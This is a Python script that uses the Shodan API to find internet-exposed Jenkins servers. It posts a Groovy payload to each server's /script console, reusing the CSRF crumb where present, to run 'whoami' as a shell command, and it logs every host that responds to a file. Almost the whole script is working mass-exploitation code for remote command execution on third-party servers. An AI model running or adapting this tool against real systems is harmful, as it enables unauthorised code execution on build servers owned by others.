#!/usr/bin/env python
#
# jenkins.py
# Search SHODAN for vunerable jenkins servers
#
# Author: random_robbie

import shodan
import sys
import re
import requests
import requests.cookies
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from time import sleep

# Configuration
API_KEY = "YOURSHODANAPIKEY"
SEARCH_FOR = 'x-jenkins 200'
FILE = "/script"
session = requests.Session()


def get_user (IP,PORT,FILE,CRUMB):
	try:
		URL = "http://"+IP+":"+PORT+""+FILE+""
		paramsPost = {"Jenkins-Crumb":""+CRUMB+"","json":"{\"script\": \"println new ProcessBuilder(\\\"sh\\\",\\\"-c\\\",\\\"whoami\\\").redirectErrorStream(true).start().text\", \"\": \"\\\"\", \"Jenkins-Crumb\": \"4aa6395666702e283f9f3727c4a6df12\"}","Submit":"Run","script":"println new ProcessBuilder(\"sh\",\"-c\",\"whoami\").redirectErrorStream(true).start().text"}
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","Referer":URL,"Content-Type":"application/x-www-form-urlencoded"}
		response = session.post(URL, data=paramsPost, headers=headers, timeout=15, verify=False)
		result = response.text
		user = re.compile('<h2>Result</h2><pre>(.+?)\n').findall(response.text)[0]
		print ("[*] Jeknins User is: "+user+" [*]")
		text_file = open("jenkins.txt", "a")
		text_file.write("[*] "+URL+" - "+user+"\n")
		text_file.close()
			
	except Exception as e:
		print (e)
		print ("[*] Manually Check This "+URL+" [*]\n")


def test_jenkins (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		URL = "http://"+IP+":"+PORT+""+FILE+""
		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
		response = session.get(URL, headers=headers, timeout=15, verify=False)
		if "Jenkins" in response.text:
			if 'Jenkins-Crumb' in response.text:
				CRUMB = re.compile('Jenkins-Crumb", "(.+?)"').findall(response.text)[0]
				get_user(IP,PORT,FILE,CRUMB)
			else:
				get_user(IP,PORT,FILE,"")
	
			
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				test_jenkins (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
